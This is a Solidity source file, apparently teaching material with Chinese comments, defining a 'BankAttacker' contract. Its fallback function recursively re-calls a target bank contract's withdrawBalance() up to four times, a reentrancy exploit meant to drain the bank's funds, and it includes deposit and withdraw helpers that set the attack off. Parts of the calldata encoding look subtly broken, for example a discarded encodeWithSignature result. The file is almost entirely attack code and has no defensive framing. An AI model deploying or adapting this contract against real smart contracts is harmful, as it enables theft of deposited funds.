// SPDX-License-Identifier: GPL-3.0
pragma solidity >=0.6.2 <0.9.0;

// 银行攻击者合约
contract BankAttacker {
    bool public attacked;
    uint attack_times;
    address payable public bankAddress;
    uint public attack_cnt;

    event Attack(uint value);

    constructor(address payable _bankAddress, bool _attacked) payable {
        bankAddress = _bankAddress;
        attacked = _attacked;
        attack_cnt = 1;
        attack_times = 4;
    }

    function attack() public {
        emit Attack(attack_cnt);
        ++attack_cnt;
    }

    // 回退函数，向一个合约地址转账会触发该函数
    // 在该函数里进行递归调用转账函数，就达到攻击的目的
    fallback() external payable {
        
        // if (attacked == false) {
        //     attacked = true;
        if (attack_times > 0) {    // 递归条件，须能终止
            --attack_times;
            bytes4 func = bytes4(keccak256("withdrawBalance()"));
            abi.encodeWithSignature("withdrawBalance()", msg.value);
            address(bankAddress).call(abi.encode(func));
            attack();
        }
    }

    function deposit() public payable {
        bytes memory addToBalance = abi.encode(bytes4(keccak256("addToBalance()")));
        (bool success, bytes memory returnData) = address(bankAddress).call{value: msg.value, gas: 1000000000}(addToBalance);
    }

    function withdraw() public payable {
        // bytes4 func = bytes4(keccak256("withdrawBalance()"));
        // address(bankAddress).call(abi.encode(func));
        bytes memory withdrawBalance = abi.encode(bytes4(keccak256("withdrawBalance()")));
        (bool success, bytes memory returnData) = address(bankAddress).call(withdrawBalance);
        attack();
    }

    function test() public {
        bytes4 funcIdentifier = bytes4(keccak256("functionNotExist()"));
        address(bankAddress).call(abi.encode(funcIdentifier));
    }
}
